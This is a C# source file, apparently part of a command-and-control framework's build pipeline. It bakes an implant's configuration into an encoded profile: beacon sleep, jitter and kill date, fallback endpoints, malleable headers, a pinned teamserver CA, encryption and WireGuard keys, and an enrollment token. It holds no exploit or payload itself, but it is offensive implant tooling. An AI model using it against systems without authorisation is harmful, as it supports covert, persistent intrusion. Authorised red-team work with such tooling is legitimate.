using System.Text;
using System.Text.Json;
using Rod.CoreState;
using Rod.CoreState.Implants;

namespace Rod.BuildPipeline.PayloadBuild;

/// <summary>
/// Renders the baked profile: the language-neutral wire contract every build
/// unit emits, whatever language it compiles. The shape is a compact JSON
/// map, base64-url-encoded without padding so it is safe to embed verbatim
/// in a generated source file (a .NET string literal or a Rust one alike).
///
/// The key set is what an implant consumes: the egress endpoints and their
/// malleable knobs, the beacon cadence and fuse, the envelope settings, the
/// verbs the artifact may run, and -- when the build minted one -- the
/// enrollment credential. No key material is baked at all: the implant's
/// cryptographic identity is the keypair it generates at first run, bound
/// by the CA-signed leaf at enroll (architecture.md Sec 5.1, Sec 9).
/// </summary>
public static class ProfileBake
{
    public static string Render(BuildParams @params)
    {
        // The class's reduced verb set (architecture.md Sec 5.2) plus the
        // contract-only verbs no class gates, comma-joined so the artifact is
        // self-describing: it carries the verbs it is permitted to run.
        var verbs = string.Join(",", ImplantClassCapabilities.For(@params.Class)
            .Concat(ImplantClassCapabilities.Ungated));
        // Headers ride as a nested JSON object (an empty profile emits {})
        // with keys sorted for stable byte output, so the baked profile
        // matches the wire-contract shape across build units.
        var map = new Dictionary<string, object>
        {
            ["enrollURL"] = @params.Transport.Endpoint,
            // The pinned teamserver CA: the implant validates the server it
            // dials against this anchor. Empty keeps system/default
            // validation. The CA rides every trust posture -- it is the
            // tasking signer; tlsTrust says whether it is also the TLS root.
            ["caCert"] = @params.Transport.CaPem ?? "",
            // "pinned" -- the default, the CA above as the only TLS root --
            // or "public": the front presents a publicly-trusted chain and
            // the implant validates like an ordinary client against the
            // compiled-in Mozilla root set (a real-domain front).
            ["tlsTrust"] = @params.Transport.TlsTrust == TlsTrust.Public
                ? "public"
                : "pinned",
            ["fallbackEnrollURLs"] = @params.Transport.FallbackEndpoints.ToArray(),
            ["mode"] = @params.Beacon.Mode,
            // Empty string is the open-ended shape: the reader treats a
            // missing or empty kill date as "no fuse" and never
            // self-terminates.
            ["killDate"] = @params.Beacon.KillDate?.ToString("O") ?? "",
            ["sleep"] = ((long)@params.Beacon.Sleep.TotalSeconds).ToString() + "s",
            ["jitter"] = ((long)@params.Beacon.Jitter.TotalSeconds).ToString() + "s",
            ["enrollPath"] = @params.Transport.EnrollPath,
            ["userAgent"] = @params.Transport.UserAgent,
            ["headers"] = RenderHeadersMap(@params.Transport.Headers),
            ["requestTimeout"] = ((long)@params.Transport.RequestTimeout.TotalSeconds).ToString() + "s",
            ["envelope"] = @params.Transport.Envelope.ToString().ToLowerInvariant(),
            // Contact protection, its own knob beside the enroll-body
            // envelope: "aesgcm" seals every contact body under the baked
            // key, "none" is the lab-debug plaintext frame. The key must
            // actually ride the params -- a protection ask with no key never
            // bakes a seal the artifact cannot honor.
            ["contactEnvelope"] = @params.Transport.ContactProtection && @params.EnvelopeKey is not null
                ? "aesgcm"
                : "none",
            ["verbs"] = verbs,
        };
        // The AES-GCM envelope key, when the profile asked for the encrypted
        // envelope: one base64 value carrying the key id and the key. Omitted
        // entirely when absent, so a plaintext-envelope build bakes the same
        // profile it always did.
        if (@params.EnvelopeKeyId is { } envelopeKeyId && @params.EnvelopeKey is { } envelopeKey)
            map["envelopeKey"] = Convert.ToBase64String(envelopeKeyId.ToByteArray().Concat(envelopeKey).ToArray());
        // The WireGuard pair a wireguard-listener build mints (Sec 8, Sec
        // 15.3 ADR-004 as amended): the artifact's private half and the
        // listener's server key as its public half, both base64 of 32 bytes.
        // Omitted entirely on every other build, so nothing else's bake
        // changes shape.
        if (@params.WireGuardPrivateKey is { } wgPrivate && @params.WireGuardServerPublicKey is { } wgServer)
        {
            map["wgPrivateKey"] = Convert.ToBase64String(wgPrivate);
            map["wgServerKey"] = Convert.ToBase64String(wgServer);
        }
        // The enrollment credential, when the build was minted one: the
        // artifact deploys with zero run-time arguments and spends the token
        // at its own enroll. Omitted entirely when absent.
        if (@params.TokenSecret is { } tokenSecret)
            map["token"] = tokenSecret;
        var json = JsonSerializer.Serialize(map);
        return Base64Url.Encode(Encoding.UTF8.GetBytes(json));
    }

    // The headers as a sorted JSON-object value ({} when empty), so the
    // baked profile's byte output is stable regardless of dictionary
    // iteration order.
    private static Dictionary<string, string> RenderHeadersMap(IReadOnlyDictionary<string, string> headers)
    {
        var ordered = new Dictionary<string, string>(StringComparer.Ordinal);
        foreach (var key in headers.Keys.OrderBy(k => k, StringComparer.Ordinal))
            ordered[key] = headers[key];
        return ordered;
    }
}
